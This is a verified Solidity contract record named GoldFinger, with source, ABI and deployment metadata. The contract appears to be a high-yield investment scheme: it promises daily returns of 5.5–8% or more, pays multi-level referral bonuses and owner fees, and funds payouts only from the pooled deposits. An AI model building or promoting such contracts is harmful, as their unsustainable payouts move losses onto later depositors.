{"SourceCode": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.5.0;\r\n\r\ncontract GoldFinger {\r\n    using SafeMath for uint256;\r\n\r\n    uint256 constant public INVEST_MIN_AMOUNT = 0.05 ether;\r\n    uint256[] public REFERRAL_PERCENTS = [50, 30, 20];\r\n    uint256 constant public PROJECT_FEE = 50;\r\n    uint256 constant public PERCENT_STEP = 5;\r\n    uint256 constant public PERCENTS_DIVIDER = 1000;\r\n    uint256 constant public TIME_STEP = 1 days;\r\n\r\n    uint256 public totalStaked;\r\n    uint256 public totalRefBonus;\r\n\r\n    struct Plan {\r\n        uint256 time;\r\n        uint256 percent;\r\n    }\r\n\r\n    Plan[] internal plans;\r\n\r\n    struct Deposit {\r\n        uint8 plan;\r\n        uint256 percent;\r\n        uint256 amount;\r\n        uint256 profit;\r\n        uint256 start;\r\n        uint256 finish;\r\n    }\r\n\r\n    struct User {\r\n        Deposit[] deposits;\r\n        uint256 checkpoint;\r\n        address referrer;\r\n        uint256[3] levels;\r\n        uint256 bonus;\r\n        uint256 totalBonus;\r\n    }\r\n\r\n    mapping(address => User) internal users;\r\n\r\n    uint256 public startUNIX;\r\n    uint256 public totalInvestors;\r\n    address payable public commissionWallet;\r\n\r\n    event Newbie(address user);\r\n    event NewDeposit(address indexed user, uint8 plan, uint256 percent, uint256 amount, uint256 profit, uint256 start, uint256 finish);\r\n    event Withdrawn(address indexed user, uint256 amount);\r\n    event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);\r\n    event FeePayed(address indexed user, uint256 totalAmount);\r\n\r\n    address internal _owner;\r\n    modifier onlyOwner() {\r\n        require(_owner == msg.sender, \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    constructor(address payable wallet, uint256 _startDate) public {\r\n        _owner = msg.sender;\r\n        require(!isContract(wallet));\r\n        require(_startDate > 0);\r\n        commissionWallet = wallet;\r\n        startUNIX = _startDate;\r\n\r\n        plans.push(Plan(28, 80));\r\n        plans.push(Plan(45, 65));\r\n        plans.push(Plan(60, 55));\r\n        plans.push(Plan(28, 80));\r\n        plans.push(Plan(45, 65));\r\n        plans.push(Plan(60, 55));\r\n    }\r\n\r\n    function invest(address referrer, uint8 plan) public payable {\r\n\r\n        require(startUNIX <= block.timestamp, \"not start yet\");\r\n\r\n        require(msg.value >= INVEST_MIN_AMOUNT);\r\n        require(plan < 6, \"Invalid plan\");\r\n\r\n        uint256 fee = msg.value.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);\r\n        commissionWallet.transfer(fee);\r\n        emit FeePayed(msg.sender, fee);\r\n\r\n        User storage user = users[msg.sender];\r\n\r\n        if (user.referrer == address(0)) {\r\n            totalInvestors = totalInvestors.add(1);\r\n            if (users[referrer].deposits.length > 0 && referrer != msg.sender) {\r\n                user.referrer = referrer;\r\n            }\r\n\r\n            address upline = user.referrer;\r\n            for (uint256 i = 0; i < 3; i++) {\r\n                if (upline != address(0)) {\r\n                    users[upline].levels[i] = users[upline].levels[i].add(1);\r\n                    upline = users[upline].referrer;\r\n                } else break;\r\n            }\r\n        }\r\n\r\n        address upline = user.referrer;\r\n        for (uint256 i = 0; i < 3; i++) {\r\n            if (upline != address(0)) {\r\n                uint256 amount = msg.value.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);\r\n                users[upline].bonus = users[upline].bonus.add(amount);\r\n                users[upline].totalBonus = users[upline].totalBonus.add(amount);\r\n                emit RefBonus(upline, msg.sender, i, amount);\r\n                upline = users[upline].referrer;\r\n            } else {\r\n                uint256 amount = msg.value.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);\r\n                users[_owner].bonus = users[_owner].bonus.add(amount);\r\n                users[_owner].totalBonus = users[_owner].totalBonus.add(amount);\r\n                emit RefBonus(_owner, msg.sender, i, amount);\r\n                upline = address(0);\r\n            }\r\n        }\r\n\r\n\r\n        if (user.deposits.length == 0) {\r\n            user.checkpoint = block.timestamp;\r\n            emit Newbie(msg.sender);\r\n        }\r\n\r\n        (uint256 percent, uint256 profit, uint256 finish) = getResult(plan, msg.value);\r\n        user.deposits.push(Deposit(plan, percent, msg.value, profit, block.timestamp, finish));\r\n\r\n        totalStaked = totalStaked.add(msg.value);\r\n        emit NewDeposit(msg.sender, plan, percent, msg.value, profit, block.timestamp, finish);\r\n    }\r\n\r\n    function withdraw() public {\r\n        User storage user = users[msg.sender];\r\n\r\n        uint256 totalAmount = getUserDividends(msg.sender);\r\n\r\n        uint256 referralBonus = getUserReferralBonus(msg.sender);\r\n        if (referralBonus > 0) {\r\n            user.bonus = 0;\r\n            totalAmount = totalAmount.add(referralBonus);\r\n        }\r\n\r\n        require(totalAmount > 0, \"User has no dividends\");\r\n\r\n        uint256 contractBalance = address(this).balance;\r\n        if (contractBalance < totalAmount) {\r\n            totalAmount = contractBalance;\r\n        }\r\n\r\n        user.checkpoint = block.timestamp;\r\n        uint256 fee = totalAmount.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);\r\n        commissionWallet.transfer(fee);\r\n        emit FeePayed(msg.sender, fee);\r\n        totalAmount = totalAmount.sub(fee);\r\n\r\n        msg.sender.transfer(totalAmount);\r\n\r\n        emit Withdrawn(msg.sender, totalAmount);\r\n\r\n    }\r\n\r\n    function updateStartTime(uint256 newTime) external onlyOwner returns (bool){\r\n        require(block.timestamp < startUNIX, \"already started!\");\r\n        require(startUNIX < newTime, \"invalid time!\");\r\n        startUNIX = newTime;\r\n        return true;\r\n    }\r\n\r\n    function getContractBalance() public view returns (uint256) {\r\n        return address(this).balance;\r\n    }\r\n\r\n    function getPlanInfo(uint8 plan) public view returns (uint256 time, uint256 percent) {\r\n        time = plans[plan].time;\r\n        percent = plans[plan].percent;\r\n    }\r\n\r\n    function getPercent(uint8 plan) public view returns (uint256) {\r\n        if (block.timestamp > startUNIX) {\r\n            return plans[plan].percent.add(PERCENT_STEP.mul(block.timestamp.sub(startUNIX)).div(TIME_STEP));\r\n        } else {\r\n            return plans[plan].percent;\r\n        }\r\n    }\r\n\r\n    function getResult(uint8 plan, uint256 deposit) public view returns (uint256 percent, uint256 profit, uint256 finish) {\r\n        percent = getPercent(plan);\r\n\r\n        if (plan < 3) {\r\n            profit = deposit.mul(percent).div(PERCENTS_DIVIDER).mul(plans[plan].time);\r\n        } else if (plan < 6) {\r\n            for (uint256 i = 0; i < plans[plan].time; i++) {\r\n                profit = profit.add((deposit.add(profit)).mul(percent).div(PERCENTS_DIVIDER));\r\n            }\r\n        }\r\n\r\n        finish = block.timestamp.add(plans[plan].time.mul(TIME_STEP));\r\n    }\r\n\r\n    function getUserDividends(address userAddress) public view returns (uint256) {\r\n        User storage user = users[userAddress];\r\n\r\n        uint256 totalAmount;\r\n\r\n        for (uint256 i = 0; i < user.deposits.length; i++) {\r\n            if (user.checkpoint < user.deposits[i].finish) {\r\n                if (user.deposits[i].plan < 3) {\r\n                    uint256 share = user.deposits[i].amount.mul(user.deposits[i].percent).div(PERCENTS_DIVIDER);\r\n                    uint256 from = user.deposits[i].start > user.checkpoint ? user.deposits[i].start : user.checkpoint;\r\n                    uint256 to = user.deposits[i].finish < block.timestamp ? user.deposits[i].finish : block.timestamp;\r\n                    if (from < to) {\r\n                        totalAmount = totalAmount.add(share.mul(to.sub(from)).div(TIME_STEP));\r\n                    }\r\n                } else if (block.timestamp > user.deposits[i].finish) {\r\n                    totalAmount = totalAmount.add(user.deposits[i].profit);\r\n                }\r\n            }\r\n        }\r\n\r\n        return totalAmount;\r\n    }\r\n\r\n    function getUserCheckpoint(address userAddress) public view returns (uint256) {\r\n        return users[userAddress].checkpoint;\r\n    }\r\n\r\n    function getUserReferrer(address userAddress) public view returns (address) {\r\n        return users[userAddress].referrer;\r\n    }\r\n\r\n    function getUserDownlineCount(address userAddress) public view returns (uint256, uint256, uint256) {\r\n        return (users[userAddress].levels[0], users[userAddress].levels[1], users[userAddress].levels[2]);\r\n    }\r\n\r\n    function getUserReferralBonus(address userAddress) public view returns (uint256) {\r\n        return users[userAddress].bonus;\r\n    }\r\n\r\n    function getUserReferralTotalBonus(address userAddress) public view returns (uint256) {\r\n        return users[userAddress].totalBonus;\r\n    }\r\n\r\n    function getUserReferralWithdrawn(address userAddress) public view returns (uint256) {\r\n        return users[userAddress].totalBonus.sub(users[userAddress].bonus);\r\n    }\r\n\r\n    function getUserAvailable(address userAddress) public view returns (uint256) {\r\n        return getUserReferralBonus(userAddress).add(getUserDividends(userAddress));\r\n    }\r\n\r\n    function getUserAmountOfDeposits(address userAddress) public view returns (uint256) {\r\n        return users[userAddress].deposits.length;\r\n    }\r\n\r\n    function getUserTotalDeposits(address userAddress) public view returns (uint256 amount) {\r\n        for (uint256 i = 0; i < users[userAddress].deposits.length; i++) {\r\n            amount = amount.add(users[userAddress].deposits[i].amount);\r\n        }\r\n    }\r\n\r\n    function getUserDepositInfo(address userAddress, uint256 index) public view returns (uint8 plan, uint256 percent, uint256 amount, uint256 profit, uint256 start, uint256 finish) {\r\n        User storage user = users[userAddress];\r\n\r\n        plan = user.deposits[index].plan;\r\n        percent = user.deposits[index].percent;\r\n        amount = user.deposits[index].amount;\r\n        profit = user.deposits[index].profit;\r\n        start = user.deposits[index].start;\r\n        finish = user.deposits[index].finish;\r\n    }\r\n\r\n    function isContract(address addr) internal view returns (bool) {\r\n        uint size;\r\n        assembly {size := extcodesize(addr)}\r\n        return size > 0;\r\n    }\r\n}\r\n\r\nlibrary SafeMath {\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b <= a, \"SafeMath: subtraction overflow\");\r\n        uint256 c = a - b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b > 0, \"SafeMath: division by zero\");\r\n        uint256 c = a / b;\r\n\r\n        return c;\r\n    }\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"wallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_startDate\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"totalAmount\",\"type\":\"uint256\"}],\"name\":\"FeePayed\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"plan\",\"type\":\"uint8\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"percent\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"profit\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"start\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"finish\",\"type\":\"uint256\"}],\"name\":\"NewDeposit\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"}],\"name\":\"Newbie\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"referrer\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"referral\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"uint256\",\"name\":\"level\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"RefBonus\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"Withdrawn\",\"type\":\"event\"},{\"constant\":true,\"inputs\":[],\"name\":\"INVEST_MIN_AMOUNT\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"PERCENTS_DIVIDER\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"PERCENT_STEP\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"PROJECT_FEE\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"REFERRAL_PERCENTS\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"TIME_STEP\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"commissionWallet\",\"outputs\":[{\"internalType\":\"address payable\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"getContractBalance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"plan\",\"type\":\"uint8\"}],\"name\":\"getPercent\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"plan\",\"type\":\"uint8\"}],\"name\":\"getPlanInfo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"time\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"percent\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"plan\",\"type\":\"uint8\"},{\"internalType\":\"uint256\",\"name\":\"deposit\",\"type\":\"uint256\"}],\"name\":\"getResult\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"percent\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"profit\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"finish\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"}],\"name\":\"getUserAmountOfDeposits\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"}],\"name\":\"getUserAvailable\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"}],\"name\":\"getUserCheckpoint\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"index\",\"type\":\"uint256\"}],\"name\":\"getUserDepositInfo\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"plan\",\"type\":\"uint8\"},{\"internalType\":\"uint256\",\"name\":\"percent\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"profit\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"start\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"finish\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"}],\"name\":\"getUserDividends\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"}],\"name\":\"getUserDownlineCount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"}],\"name\":\"getUserReferralBonus\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"}],\"name\":\"getUserReferralTotalBonus\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"}],\"name\":\"getUserReferralWithdrawn\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"}],\"name\":\"getUserReferrer\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"}],\"name\":\"getUserTotalDeposits\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"referrer\",\"type\":\"address\"},{\"internalType\":\"uint8\",\"name\":\"plan\",\"type\":\"uint8\"}],\"name\":\"invest\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"startUNIX\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalInvestors\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalRefBonus\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalStaked\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newTime\",\"type\":\"uint256\"}],\"name\":\"updateStartTime\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"withdraw\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "GoldFinger", "CompilerVersion": "v0.5.16+commit.9c3226ce", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "0000000000000000000000001731c4f050bd04a1621f581959b8b1363e75e3d1000000000000000000000000000000000000000000000000000000006513c4e0", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "bzzr://58d693901b117ef0a2e23e13541d9ad7456488fafac623ffc6b77170ce04e053"}